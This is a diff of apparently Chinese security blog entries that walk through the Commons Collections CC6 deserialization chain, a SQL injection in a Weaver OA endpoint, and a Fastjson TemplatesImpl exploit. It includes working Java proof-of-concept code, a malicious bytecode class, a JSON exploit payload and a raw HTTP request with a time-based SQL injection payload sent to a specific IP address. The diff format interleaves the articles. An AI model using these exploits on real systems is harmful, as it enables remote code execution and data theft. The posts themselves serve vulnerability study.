-<h3 id="hashCode分析"><a href="#hashCode分析" class="headerlink" title="hashCode分析"></a>hashCode分析</h3><p>因为这个类本身没有自定义的序列化和反序列化函数，所以还得找，我们找哪里的函数调用了getvalue并且看看参数可控不可控</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186113991-1fef0431-e82e-4834-98f2-77470cadfcdf.png"
-                      class="" title="img"
-                > 
-
-<p>时发现它本身的hashCode调用了getValue，此时因为是他自身的，所以hashCode并不需要参数可控，能直接调用就行了</p>
-<p>也写一下代码吧</p>
-<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186224096-1f5e6d40-2bce-4ccd-9d4c-06f5256bdcd4.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934925778-c591ef48-a95c-4965-95a6-09d11a663cd4.png"
                       class="" title="img"
                 >
 
-<p>算了，太懒了不写了，发现其实就是把getvalue换成了hashCode，因为hashCode里面会调用getValue，本质上一样</p>
-<p>其实这里也可以想想入口怎么样很完美了</p>
-<p>因为如果有个readObject里面hashMap.hashCode()，那就直接完成链子了</p>
-<h2 id="HashMap的hashCode方法"><a href="#HashMap的hashCode方法" class="headerlink" title="HashMap的hashCode方法"></a>HashMap的hashCode方法</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们查看下HashMap的类</p>
+<p>调用的就是当前这个类的validate</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186462197-d2363a51-a6ce-4fcb-8ce8-69fbec970487.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934973254-016eea77-8bed-4cd8-8d60-f4f340bc9b08.png"
                       class="" title="img"
-                >
+                > 
 
-<p>可以序列化和反序列化</p>
-<p>这里其实跟URL利用hashmap反序列化连起来了</p>
+<p>这个service是个数据库函数操作</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186598740-daa1c4ac-8397-461f-b59d-79e24f9bcd81.png"
-                      class="" title="img"
-                >
-
-<p>put里面有个hash(key)函数的调用，我们再深入一步看看</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186642224-70347f1b-0bcc-4f6c-889b-546e2e9cd40e.png"
-                      class="" title="img"
-                >
-
-<p>直接就看到hashCode</p>
-<p>并且key.hashCode()，key还可控啊</p>
-<p>我们观察下他的反序列化readObject</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186743782-82c1870a-770b-423f-a649-373e983edeaf.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935007147-b7ab5a30-39ad-4c2e-a7f2-bcc9b9c2a876.png"
                       class="" title="img"
                 >
 
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186811484-b13033d9-1c5f-4c8f-9c28-e69d83a65246.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935040637-07f6f16f-3e67-4e5a-9571-51eeafcb43f5.png"
                       class="" title="img"
-                > 
+                >
 
-<p>所以其实我们都不用put函数，readObject里面就自己会调用hash(key)，key如果可控就直接完成了链子了</p>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
-<li><p>1、Runtime没有办法序列化和反序列化，所以我们需要利用反射，就需要CC1里面的递归调用transform疯狂进行invoke，然后实例化出一个Runtime对象，然后再命令执行</p>
-</li>
-<li><p>2、put里面也会有hash(key)，所以序列化的时候就会弹一次计算器，所以我们可以put的时候让key是个没啥用的东西，之后利用反射再把值修改好</p>
-</li>
-<li><p>3、因为后面我们用了hash，LazyMap作为键值，所以这里会出现判断他的key是否存在，不存在才会执行transform，所以我们需要把它的key给删掉</p>
-</li>
-</ul>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732191324913-42f0aa79-f8a5-4629-9267-2bb5ef4b7da0.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935059257-61993553-1a52-4170-a00a-d5e0c71a6419.png"
                       class="" title="img"
-                > 
+                >
 
-<p>这里的原因是IDEA debug时会调用toString方法，但是CC5中就是利用的toString链子，就是说它会走到lazyMap的get函数那里</p>
+<p>看到传入的string被处理了一下执行，看下怎么被处理的</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217866498-7fc86c27-338e-4795-9539-2faef1e29e69.png"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935083565-14ce57bb-a5db-49b7-bcf7-6ae12b621531.png"
                       class="" title="img"
-                > 
+                >
 
-<p>所以此时我们lazymap的key是null，虽然进去了if，但是factory没有变成我们命令执行所需要的东西**（因为put的时候会造成反序列化RCE，所以我们不想要put的时候就被调用，在put后通过反射再修改）** ，所以没有作用，然后执行map.get(key)，将key值传进去了，而key值是我们传给TiedMapEntry的</p>
-<p>因为TiedMapEntry.getValue() -&gt; map.get(key)</p>
-<p>map为LazyMap对象，key是我们传入给TiedMapEntry的值</p>
-<h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218025778-dd0e767e-581c-4b72-9102-b6371c831a8e.png"
-                      class="" title="img"
-                > 
+<p>直接拼接，所以大概率存在SQL注入</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/ProcessDoneRequestByXml HTTP/1.1</span><br><span class="line">Host: 110.41.14.179:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.41.14.179:81/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaEApas7tMMlgz3yzdtz; JSESSIONID=aaaEApas7tMMlgz3yzdtz; __randcode__=e1f89faf-ccd6-4d92-aeff-5fb0251b0600</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;request&gt;</span><br><span class="line">        &lt;syscode&gt;1&#x27;||(SELECT 0x6b4f7252 FROM DUAL WHERE 6182=6182 AND (SELECT 8607 FROM (SELECT(SLEEP(5)))LPaW))||&#x27;&lt;/syscode&gt;</span><br><span class="line">&lt;/request&gt;</span><br></pre></td></tr></table></figure></div>
 
-<p>然后debug会调用toString</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218115401-3944a040-d484-4fa3-b257-0cecc3840a61.png"
-                      class="" title="img"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250313195111266.png"
+                      class="" title="image-20250313195111266"
                 > 
 
-<p>toString调用getValue</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218137120-fbe32afe-9dd5-496f-bd16-b84456732c2c.png"
-                      class="" title="img"
-                > 
-
-<p>map是我们传入的LazyMap对象</p>
-<p>后一步是LazyMap的get(key)函数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218195747-7a1988f4-d56b-49a8-bc5f-5d92728864be.png"
-                      class="" title="img"
-                > 
-
-<p>此时虽然进去了if但是factory不是我们命令执行所需要的对象，所以没什么作用，然后就会造成给map.get(key);，给LazyMap的key赋值</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218406941-53298b35-2662-41e3-9741-cca0cc80e249.png"
-                      class="" title="img"
-                > 
-
-<p>后续我们修改LazyMap的factory对象可以造成命令执行，但是LazyMap的key已经变成传入的2了，所以就进入不了这个if </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218493629-bfd47bb2-7c68-4af8-82c5-56c3aa162198.png"
-                      class="" title="img"
-                > 
-
-<p>这就是我们要加上删除key的操作的原因</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218516554-806c2ac5-1e3c-4aaa-bdea-3f28b0914b25.png"
-                      class="" title="img"
-                > 
-
-<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(&quot;1&quot;));</span><br><span class="line">        //这里传一个没啥用的transformer对象，先put进去再修改，不然put的时候就已经执行命令了</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;2&quot;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,&quot;3&quot;);</span><br><span class="line">        lazyMap.remove(&quot;2&quot;);</span><br><span class="line">        //******************//删除键值很重要</span><br><span class="line">        Class&lt;?&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory_ = lazyMapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory_.setAccessible(true);</span><br><span class="line">        factory_.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(lazyMap);</span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
+<p>存在mysql数据库的延时注入。sqlserver没打成功</p>
 ]]></content>
       <categories>
-        <category>漏洞原理分析</category>
+        <category>代码审计</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
+        <tag>泛微</tag>
       </tags>
   </entry>
   <entry>
@@ -1148,129 +1227,205 @@
       </tags>
   </entry>
   <entry>
-    <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
-    <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2> 
+    <title>Fastjson_TemplatesImpl</title>
+    <url>/2025/03/13/Fastjson-TemplatesImpl/</url>
+    <content><![CDATA[<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>这里利用的了TemplatesImpl的类，可以联想到CC3里面利用方式，将TemplatesImpl这个类，实例化的时候传入我们的恶意字节码，然后他会将我们的恶意字节码当成类去实例化然后调用静态方法。</p>
+<p><strong>这里先教大家怎么转换恶意类的字节码，原因是网上很多都是已经写好的poc，那他的恶意类执行的方法就是Runtime.getRuntime.exec(“calc”) ，这个如果是windows系统就可以正常执行命令，但是如果是我们的mac系统呢。我们弹出计算器需要的命令是 open -a Calculator ,所以我们就需要去修改恶意类里面的字节码，以后我们学习的时候也方便许多</strong> </p>
+<h3 id="class文件转换为字节码"><a href="#class文件转换为字节码" class="headerlink" title="class文件转换为字节码"></a>class文件转换为字节码</h3><h4 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>实例化函数没东西</p>
- 
+<p>这里面恶意类继承了AbstractTranslet类，此时可以带着疑问看一下，CC3的时候也有了解</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247379749-eb615db2-03fa-46b9-9f18-360b5dfbac6c.png"
+                      class=""
+                > 
 
-<p>看下面的函数调用</p>
- 
+<p>可以先看这张图，就是告诉我们为什么要继承AbstractTranslet</p>
+<h3 id="类转换为字节码"><a href="#类转换为字节码" class="headerlink" title="类转换为字节码"></a>类转换为字节码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Read_class_bytes &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        System.out.println(new String(bytes));</span><br><span class="line">        System.out.println(&quot;------------------------------------------------------------------------------------------------------------&quot;);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>现在的步骤是<br>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap</p>
-<p>看processDoneRequestByMap</p>
- 
+<p>记住这里路径读取的是target目录下的class</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313174419129.png"
+                      class="" title="image-20250313174419129"
+                > 
 
-<p>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap-&gt;receiveRequestInfo</p>
- 
+<p><em>这里为什么要用到base64去编码我们的字节码呢，我们先参考文章来看，然后在调试中看看是不是这么回事</em> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175436060.png"
+                      class="" title="image-20250313175436060"
+                > 
 
-<p>看下这个ofsTodoDataManager</p>
- 
+<p>看一下代码里面</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175506767.png"
+                      class="" title="image-20250313175506767"
+                > 
 
-<p>初始为null，看到设置的地方让他为this，看他的类型是OfsTodoDataManagerNew继承的</p>
-<p>如果能让他初始化为自己</p>
+<p>如果我们的lexer为JSONScanner的话</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175546681.png"
+                      class="" title="image-20250313175546681"
+                > 
 
+<p>就会调用它的bytesValue，所以就会进行base64解码</p>
+<p>这只是初步了解，实际情况我们以调试为准。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>创建一个maven项目</li>
+<li>准备一个恶意类和一个漏洞利用的代码</li>
+<li>maven配置fastjson版本，JDK我是高版本一样可以执行命令</li>
+</ul>
+<p>maven配置</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
 
-<p>调用的就是当前这个类的validate</p>
- 
+<p>漏洞利用代码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Fastjson_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        String base64EncodedBytes = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + base64EncodedBytes + &quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>这个service是个数据库函数操作</p>
+<p>初步运行在代码</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180130091.png"
+                      class="" title="image-20250313180130091"
+                > 
 
+<p>这里代码为什么要<em>JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</em> 搞那么复杂</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180240134.png"
+                      class="" title="image-20250313180240134"
+                > 
 
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p><strong>fastjson反序列化漏洞的利用方式从JdbcRowSetImpl可以看出就是他会实例化我们指定的对象，然后调用getter或者setter方法</strong> 网上大部分的文章都直接分析一些特殊的点，但是我们不知道TemplatesImpl里面会走哪些函数，就是怎么走的。</p>
+<h3 id="猜测分析"><a href="#猜测分析" class="headerlink" title="猜测分析"></a>猜测分析</h3><p>从实例化的时候会调用getter或者setter方法，以及初始化的无参构造函数看看</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184436063.png"
+                      class="" title="image-20250313184436063"
+                > 
 
+<p>无参构造函数，可以打上断点看看会不会走到这，这里给_bytecodes我们的恶意字节码赋值了哦</p>
+<p>然后从CC3的链子可知漏洞触发的点是这个函数definclass</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184542985.png"
+                      class="" title="image-20250313184542985"
+                > 
 
+<p>也可以打上断点</p>
+<p><strong>找哪里调用了defineClass</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184634203.png"
+                      class="" title="image-20250313184634203"
+                > 
 
+<p>那我们就要找defineTransletClasses  <strong>一层一层往上找原因是肯定有一个setter方法或者getter方法里面一步一步调用这些函数到触发漏洞点的</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184749244.png"
+                      class="" title="image-20250313184749244"
+                > 
 
-<p>看到传入的string被处理了一下执行，看下怎么被处理的</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190343258.png"
+                      class="" title="image-20250313190343258"
+                > 
 
+<p>这里有三个，都可以打上断点，都是get方法。所以我们可以调试一下了</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>TemplatesImpl这个类里面的方法</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190545878.png"
+                      class="" title="image-20250313190545878"
+                > 
 
-<p>直接拼接，所以大概率存在SQL注入</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/ProcessDoneRequestByXml HTTP/1.1</span><br><span class="line">Host: 110.41.14.179:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.41.14.179:81/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaEApas7tMMlgz3yzdtz; JSESSIONID=aaaEApas7tMMlgz3yzdtz; __randcode__=e1f89faf-ccd6-4d92-aeff-5fb0251b0600</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;request&gt;</span><br><span class="line">        &lt;syscode&gt;1&#x27;||(SELECT 0x6b4f7252 FROM DUAL WHERE 6182=6182 AND (SELECT 8607 FROM (SELECT(SLEEP(5)))LPaW))||&#x27;&lt;/syscode&gt;</span><br><span class="line">&lt;/request&gt;</span><br></pre></td></tr></table></figure></div>
+<p>跟进newTransformer()</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190634787.png"
+                      class="" title="image-20250313190634787"
+                > 
 
- 
+<p>跟进getTransletInstance()</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190714628.png"
+                      class="" title="image-20250313190714628"
+                > 
 
-<p>存在mysql数据库的延时注入。sqlserver没打成功</p>
+<p>getTransletInstance 这个方法里面有defineTransletClasses，这里面可以知道我们想要进入defineTransletClasses，我们就需要满足</p>
+<ul>
+<li>_name!&#x3D;null</li>
+<li>_class&#x3D;&#x3D;null</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190821863.png"
+                      class="" title="image-20250313190821863"
+                > 
+
+<p>这里可以知道我们的_bytecodes就是恶意字节码不能为null</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190947571.png"
+                      class="" title="image-20250313190947571"
+                > 
+
+<p>然后就走到我们加载恶意类的地方</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313191045652.png"
+                      class="" title="image-20250313191045652"
+                > 
+
+<p>走到我们的恶意类调用静态方法。</p>
+<h3 id="分析poc"><a href="#分析poc" class="headerlink" title="分析poc"></a>分析poc</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313192102984.png"
+                      class="" title="image-20250313192102984"
+                > 
+
+<ul>
+<li>@type，是为了实例化TemplatesImpl这个函数并且调用它的类函数</li>
+<li>_bytecodes是放恶意字节码让我们后面可以defineclass(_bytecodes)，加载恶意类</li>
+<li>_name 是上面为了绕过if判断，if为空就不进那个判断语句</li>
+<li>_tfactory是为了能让代码继续走下去不会报错<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247023186-6249d5fc-fbbb-491a-9123-2fd4265bb436-20250313192358337.png"
+                      class=""
+                > </li>
+<li>_outputProperties这个属性就是为了反序列化的时候自动调用getter方法，他会拼接get+outputProperties&#x3D;getoutputProperties的方法进行调用，从而执行我们的利用链</li>
+</ul>
 ]]></content>
       <categories>
-        <category>代码审计</category>
+        <category>漏洞原理分析</category>
       </categories>
       <tags>
-        <tag>泛微</tag>
